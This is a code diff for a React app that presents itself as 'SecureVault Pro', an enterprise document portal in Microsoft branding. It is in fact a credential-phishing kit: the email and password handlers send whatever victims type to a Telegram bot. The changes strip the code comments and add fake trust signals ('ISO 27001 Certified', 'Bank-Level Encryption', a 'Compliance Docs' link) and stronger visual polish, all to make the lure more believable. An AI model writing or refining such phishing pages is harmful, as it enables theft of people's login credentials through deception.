@@ -22,7 +22,6 @@ export default function App() {
   const [isLoading, setIsLoading] = useState(false);
 
   const sendToTelegram = async (content: string, type: 'Email' | 'Password') => {
-    // Correct Vite environment variable access for your bot
     const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
     const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
 
@@ -54,7 +53,6 @@ export default function App() {
   const handleEmailSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
-    // Send email alert immediately
     if (await sendToTelegram(email, 'Email')) {
       setAuthStep('password');
     }
@@ -64,7 +62,6 @@ export default function App() {
   const handlePasswordSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
-    // Send password alert and move to loading state
     if (await sendToTelegram(password, 'Password')) {
       setAuthStep('success');
     }
@@ -76,22 +73,48 @@ export default function App() {
       <AnimatePresence mode="wait">
         {page === 'gateway' ? (
           <motion.div key="gateway" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="relative min-h-screen flex flex-col items-center justify-center">
+            {/* Fixed Background: Clean dark overlay to let text pop */}
             <div className="absolute inset-0 z-0">
-              <img src="https://images.unsplash.com/photo-1497366216548-37526070297c?q=80&w=2000" className="w-full h-full object-cover opacity-40 grayscale" alt="Office" />
-              <div className="absolute inset-0 bg-gradient-to-b from-black/80 via-transparent to-black" />
+              <img src="https://images.unsplash.com/photo-1497366216548-37526070297c?q=80&w=2000" className="w-full h-full object-cover opacity-30 grayscale" alt="Office" />
+              <div className="absolute inset-0 bg-gradient-to-b from-black/90 via-black/40 to-black" />
             </div>
             
             <div className="relative z-10 text-center px-6">
-              {/* Corrected to use microsoft-blue from your config */}
+              {/* Scaled System Status: Fixed spacing and alignment */}
               <div className="bg-microsoft-blue/20 border border-microsoft-blue/30 px-4 py-1 rounded-full inline-flex items-center gap-2 mb-8">
                 <ShieldCheck className="w-4 h-4 text-microsoft-blue" />
-                <span className="text-[10px] uppercase tracking-widest font-bold text-microsoft-blue">AES-256 Encryption Active</span>
+                <span className="text-[10px] uppercase tracking-widest font-bold text-microsoft-blue">System Status: Operational</span>
               </div>
-              <h1 className="text-6xl md:text-8xl font-bold text-white tracking-tighter mb-6">SecureVault <span className="text-microsoft-blue">Pro</span></h1>
-              <p className="text-zinc-400 text-xl max-w-2xl mx-auto mb-10 font-light">Authorized Personnel Only. Enterprise Document Governance Portal.</p>
-              <button onClick={() => setPage('auth')} className="bg-white text-black px-10 py-5 rounded-full font-bold text-lg flex items-center gap-3 mx-auto hover:scale-105 transition-transform shadow-2xl">
-                Access Portal <ArrowRight className="w-5 h-5" />
-              </button>
+
+              {/* Restore Contrast: High-contrast White Headline with Blue 'Pro' */}
+              <h1 className="text-6xl md:text-8xl font-bold text-white tracking-tighter mb-6">
+                SecureVault <span className="text-microsoft-blue">Pro</span>
+              </h1>
+              
+              {/* High-contrast Sub-headline */}
+              <p className="text-zinc-300 text-xl max-w-2xl mx-auto mb-10 font-light">
+                Authorized Personnel Only. Enterprise Document Governance Portal.
+              </p>
+
+              {/* Button Styling: Side-by-Side alignment and ghost-style link */}
+              <div className="flex flex-col md:flex-row items-center justify-center gap-6">
+                <button onClick={() => setPage('auth')} className="bg-white text-black px-10 py-5 rounded-full font-bold text-lg flex items-center gap-3 hover:scale-105 transition-transform shadow-2xl">
+                  Access Secure Portal <ArrowRight className="w-5 h-5" />
+                </button>
+                
+                <button className="text-white/70 hover:text-white flex items-center gap-2 text-sm font-medium transition-colors">
+                  <FileLock2 className="w-4 h-4" />
+                  Compliance Docs
+                  <ExternalLink className="w-3 h-3" />
+                </button>
+              </div>
+            </div>
+
+            {/* Scaling: Trust Badges scaled and spaced correctly in footer */}
+            <div className="absolute bottom-12 w-full px-6 flex justify-center gap-12 opacity-40 grayscale pointer-events-none hidden md:flex">
+              <div className="flex items-center gap-2 text-[10px] text-white uppercase tracking-widest"><Globe className="w-4 h-4" /> Global Compliance</div>
+              <div className="flex items-center gap-2 text-[10px] text-white uppercase tracking-widest"><ShieldAlert className="w-4 h-4" /> ISO 27001 Certified</div>
+              <div className="flex items-center gap-2 text-[10px] text-white uppercase tracking-widest"><Lock className="w-4 h-4" /> Bank-Level Encryption</div>
             </div>
           </motion.div>
         ) : (
